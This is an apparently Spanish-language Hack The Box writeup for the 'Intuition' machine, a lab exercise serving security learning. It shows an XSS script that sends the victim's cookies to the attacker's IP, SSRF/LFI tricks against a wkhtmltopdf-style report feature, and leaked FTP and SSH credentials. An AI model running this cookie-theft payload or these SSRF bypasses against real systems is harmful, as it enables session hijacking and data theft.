<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.png"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-intuition-writeup">Hack The Box: Intuition Writeup</h1>
<p>Welcome to my detailed writeup of the hard difficulty machine <strong>&ldquo;Intuition&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="enumeration">Enumeration</h1>
<p>Con nmap descubrimos estos puertos abiertos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://comprezzor.htb/
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Haciendo un breve reconocimiento en la web y utilizando <code>wfuzz</code> encontramos los siguientes subdominios.</p>
<ul>
<li>comprezzor.htb</li>
<li>report.comprezzor.htb</li>
<li>auth.comprezzor.htb</li>
<li>dashboard.comprezzor.htb</li>
</ul>
<p>En <code>auth.comprezzor.htb podemos hacernos una cuenta y acceder a </code>report.comprezzor.htb`</p>
<p>Vemos que se utiliza cifrado LMZA, esto nos recuerda al último backdoor que ocurrió en OpenSSH con la librería &ldquo;xz&rdquo; pero no van por ahí los tiros.</p>
<h1 id="foothold">FootHold</h1>
<p>Encontramos un XSS en report.comprezzor.htb.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.129.230.246 - - <span style="color:#f92672">[</span>29/Jul/2024 19:40:09<span style="color:#f92672">]</span> code 404, message File not found
</span></span><span style="display:flex;"><span>10.129.230.246 - - <span style="color:#f92672">[</span>29/Jul/2024 19:40:09<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
</span></span></code></pre></div><h2 id="robando-la-cookie-del-moderador">Robando la cookie del moderador</h2>
<p>Por lo cual, podemos probar a ver si no hay ningún tipo de sanitización y podemos inyectar un script de javascript.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// evil.js
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.71:8000/collect?c=&#34;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>).
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Consulta realizada&#34;</span>))
</span></span></code></pre></div><p><img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.129.230.246 - - <span style="color:#f92672">[</span>29/Jul/2024 19:34:05<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ae81ff">304</span> -
</span></span><span style="display:flex;"><span>10.129.230.246 - - <span style="color:#f92672">[</span>29/Jul/2024 19:34:05<span style="color:#f92672">]</span> code 404, message File not found
</span></span><span style="display:flex;"><span>10.129.230.246 - - <span style="color:#f92672">[</span>29/Jul/2024 19:34:05<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /collect?c=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
</span></span></code></pre></div><p>Esta cookie, podemos utilizarla para iniciar sesión en el subdominio.  <code>dashboard.comprezzor.htb</code></p>
<p><img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<h2 id="robando-la-cookie-del-administrador">Robando la cookie del administrador</h2>
<p>Después de investigar un rato, podemos suponer que los reportes con alta prioridad serán revisados por un usuario administrador, por lo cual si en este panel si inyectamos otra vez el script malicioso y lo establecemos como alta prioridad..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>10.129.230.246 - - <span style="color:#f92672">[</span>29/Jul/2024 19:36:55<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /collect?c=user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span>
</span></span></code></pre></div><p>Tenemos una cookie distinta, y si la decodificamos de base64.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5&#34;</span> | base64 -d
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;user_id&#34;</span>: 1, <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">}</span>|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9
</span></span></code></pre></div><p>Ahora podemos acceder al panel de administración como el usuario admin.</p>
<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<h2 id="local-file-inclusion">Local File Inclusion</h2>
<p>En este panel veo una funcionalidad que me llama la atención. <code>/create_pdf_report</code> . Lo primero que pienso es en un SSRF pero primero hay que enumerar que hace esta funcionalidad.</p>
<p><img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Podemos hacer una especie de captura de pantalla de la URL que queramos.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool report_88754.pdf | grep Creator
</span></span><span style="display:flex;"><span>Creator                         : wkhtmltopdf 0.12.6
</span></span></code></pre></div><p>Podemos ver la herramienta utilizada para esta funcionalidad, y una simple búsqueda en Google nos reporta que esta herramienta tiene una vulnerabilidad de tipo SSRF.
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Detecto un comportamiento un tanto extraño
Ya que si intentamos apuntar a un recurso local del sistema nos reporta que la URL es inválida.
<img src="images/Screenshot_9.png" alt="Write-up Image">
Pero si introducimos un espacio delante, nos reporta un error distinto.
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Si nos ponemos en escucha con <code>nc</code> podemos detectar que de esta función se encarga una utilidad en Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8000</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.71<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.246<span style="color:#f92672">]</span> <span style="color:#ae81ff">55388</span>
</span></span><span style="display:flex;"><span>GET / HTTP/1.1
</span></span><span style="display:flex;"><span>Accept-Encoding: identity
</span></span><span style="display:flex;"><span>Host: 10.10.14.71:8000
</span></span><span style="display:flex;"><span>**User-Agent: Python-urllib/3.11**
</span></span></code></pre></div><p>Pero bueno, aprovechandonos del error encontrado al espaciar la URL, podemos cargar un recurso local del sistema con file://.
<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Ahora cargando el <code>/proc/self/cmdline</code> podemos ver cual ha sido el comando para ejecutar el proceso del que depende esta funcionalidad.</p>
<p><img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<h2 id="filtrando-el-código-fuente">Filtrando el código fuente</h2>
<p>Por lo cual, podemos cargar el archivo <code>/app/code/app.py</code> y podemos ver dos cosas interesantes.</p>
<ul>
<li>Una clave secreta.</li>
<li>una linea <code>redirect from blueprints.index.index</code></li>
</ul>
<p><img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p>Cargando el archivo <code> /app/code/blueprints/index/index.py</code>
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Este archivo no nos sirve de nada pero ya sabemos que la ruta existe.
Una vez sabiendo que esta ruta existe, gracias al <code>app.py</code> podemos suponer que también existen estos recursos.</p>
<ul>
<li><code>/app/code/blueprints/report/report.py</code></li>
<li><code>/app/code/blueprints/auth/auth.py</code></li>
<li><code>/app/code/blueprints/dashboard/dashboard.py</code></li>
</ul>
<p>Antes, en el panel de administración, había detectado una funcionalidad que no sabía exactamente que es lo que hacía.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Vamos a echar un ojo al archivo <code>dashboard.py</code> a ver que contiene..
Si miramos con ojo de halcón, detectamos la siguiente linea.
<code>ftp.login(user='ftp_admin', passwd='u3jai8y71s2')</code></p>
<p><img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<p>Intento iniciar sesión por ssh pero no es posible.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh ftp_admin@comprezzor.htb
</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;comprezzor.htb (10.129.230.246)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>comprezzor.htb<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ftp_admin@comprezzor.htb&#39;</span>s password:
</span></span></code></pre></div><p>Recordemos que el puerto <code>21/TCP</code> estaba cerrado, pero gracias a este LFI, podemos cargar recursos del FTP ya que podemos solicitar el recurso <code>ftp://ftp_admin:u3jai8y71s2@ftp.local</code></p>
<h2 id="consiguiendo-una-id_rsa">Consiguiendo una id_rsa</h2>
<p><img src="images/Screenshot_17.png" alt="Write-up Image">
Hay un archivo <code>private-*.key</code> que me llama la atención.</p>
<p>Ahora lo podemos solicitar a través del SSRF con <code> ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key</code></p>
<p>Y tenemos una clave privada.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Como no se para que usuario es esta clave privada, podemos revisar el archivo <code>welcome_note.txt</code>
Y vemos que esto es para los desarrolladores, por lo cual el nombre de usuario seguramente contenga la palabra <code>dev</code>.
Además también vemos una passphrase para esta clave privada. <code>Y27SH19HDIWD</code></p>
<p><img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<p>Pero simplemente podemos comprobar a que usuario pertenece esta clave privada validando a con <code>ssh-add</code> la passphrase que hemos encontrado añadiendola a nuestro repositorio de claves privadas.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh-add id_rsa 
</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> id_rsa: 
</span></span><span style="display:flex;"><span>Identity added: id_rsa <span style="color:#f92672">(</span>dev_acc@local<span style="color:#f92672">)</span>
</span></span></code></pre></div><p><code>dev_acc</code> es el nombre de usuario de esta clave privada, ahora vamos a intentar iniciar sesión en la máquina víctima.
Aunque antes vamos a eliminar la clave privada de mi repositorio.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh-add -d id_rsa 
</span></span><span style="display:flex;"><span>Identity removed: id_rsa RSA <span style="color:#f92672">(</span>no comment<span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh dev_acc@comprezzor.htb -i id_rsa 
</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>: 
</span></span><span style="display:flex;"><span>Last login: Mon Jul <span style="color:#ae81ff">29</span> 16:29:28 <span style="color:#ae81ff">2024</span> from 10.10.14.71
</span></span><span style="display:flex;"><span>dev_acc@intuition:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dev_acc<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dev_acc<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dev_acc<span style="color:#f92672">)</span>
</span></span></code></pre></div><h1 id="user-pivoting">User Pivoting</h1>
<p>Enumerando la aplicación web en <code>/var/www/app</code> podemos ver que de base de datos utiliza SQLite3 ya que se emplean archivos <code>.db</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev_acc@intuition:/var/www/app/blueprints/report$ ls
</span></span><span style="display:flex;"><span>__pycache__  report.py  report_utils.py  reports.db  reports.sql
</span></span></code></pre></div><p>Por lo cual, para acceder a los usuarios de la plataforma (recordemos que había una sección de autenticación) simplemente tenemos que acceder al archivo <code>.db</code> correspondiente.</p>
<h2 id="crackeando-el-hash-de-adam">Crackeando el hash de <code>adam</code></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev_acc@intuition:/var/www/app/blueprints/auth$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">29</span> 16:30 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">10</span> 08:21 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">10</span> 08:21 __pycache__
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">1842</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2023</span> auth.py
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">3038</span> Sep <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2023</span> auth_utils.py
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16384</span> Jul <span style="color:#ae81ff">29</span> 16:30 users.db
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">171</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2023</span> users.sql
</span></span></code></pre></div><p>Vemos al usuario <code>adam</code> y <code>admin</code> y un hash sha256.
<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
<p>Este hash lo podemos identificar y crackear con el modo autodetect de <code>hashcat</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\pc\Desktop\hashcat-6.2.6<span style="color:#75715e">&gt;.\hashcat.exe  .\hash.txt .\rockyou.txt</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Session..........: hashcat
</span></span><span style="display:flex;"><span>Status...........: Cracked
</span></span><span style="display:flex;"><span>Hash.Mode........: 30120 (Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)))
</span></span><span style="display:flex;"><span>Hash.Target......: sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc...89fc43
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Time</span>.Started.....: Mon Jul 29 18:46:39 2024 (2 secs)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Time</span>.Estimated...: Mon Jul 29 18:46:41 2024 (0 secs)
</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
</span></span><span style="display:flex;"><span>Guess.Base.......: File (.\rockyou.txt)
</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 (100.00%)
</span></span><span style="display:flex;"><span>Speed.#1.........:  6201.3 kH/s (12.48ms) @ Accel:256 Loops:1 Thr:64 Vec:1
</span></span></code></pre></div><p>Pero esta no es la contraseña para el usuario <code>adam</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev_acc@intuition:/var/www/app/blueprints/auth$ su adam
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span>su: Authentication failure
</span></span></code></pre></div><p>Así que vamos a intentar enumerar el FTP ya que antes hemos visto que estaba abierto.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev_acc@intuition:/var/www/app/blueprints/auth$ ftp adam@127.0.01
</span></span><span style="display:flex;"><span>Connected to 127.0.01.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> pyftpdlib 1.5.7 ready.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Username ok, send password.
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
</span></span><span style="display:flex;"><span>Remote system type is UNIX.
</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
</span></span></code></pre></div><p>Dentro del FTP, en <code>/backup/runner1</code> nos encontramos los siguientes ficheros.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">150</span> File status okay. About to open data connection.
</span></span><span style="display:flex;"><span>-rwxr-xr-x   <span style="color:#ae81ff">1</span> root     <span style="color:#ae81ff">1002</span>          <span style="color:#ae81ff">318</span> Apr <span style="color:#ae81ff">06</span> 00:25 run-tests.sh
</span></span><span style="display:flex;"><span>-rwxr-xr-x   <span style="color:#ae81ff">1</span> root     <span style="color:#ae81ff">1002</span>        <span style="color:#ae81ff">16744</span> Oct <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2023</span> runner1
</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> root     <span style="color:#ae81ff">1002</span>         <span style="color:#ae81ff">3815</span> Oct <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2023</span> runner1.c
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># run-tests.sh</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># List playbooks</span>
</span></span><span style="display:flex;"><span>./runner1 list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run playbooks [Need authentication]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./runner run [playbook number] -a [auth code]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#./runner1 run 1 -a &#34;UHI75GHI****&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install roles [Need authentication]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./runner install [role url] -a [auth code]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#./runner1 install http://role.host.tld/role.tar -a &#34;UHI75GHI****&#34;</span>
</span></span></code></pre></div><p>Aquí podemos ver que se utiliza un tipo de código de autenticación el cual podemos ver entero excepto 4 carácteres.</p>
<p>El binario runner1 suponemos que es el archivo runner1.c compilado, vamos a echarle un vistazo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// runner1.c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Version : 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dirent.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;openssl/md5.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define INVENTORY_FILE &#34;/opt/playbooks/inventory.ini&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PLAYBOOK_LOCATION &#34;/opt/playbooks/&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ANSIBLE_PLAYBOOK_BIN &#34;/usr/bin/ansible-playbook&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ANSIBLE_GALAXY_BIN &#34;/usr/bin/ansible-galaxy&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define AUTH_KEY_HASH &#34;0feda17076d793c2ef2870d7427ad4ed&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">check_auth</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> auth_key) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> digest[MD5_DIGEST_LENGTH];
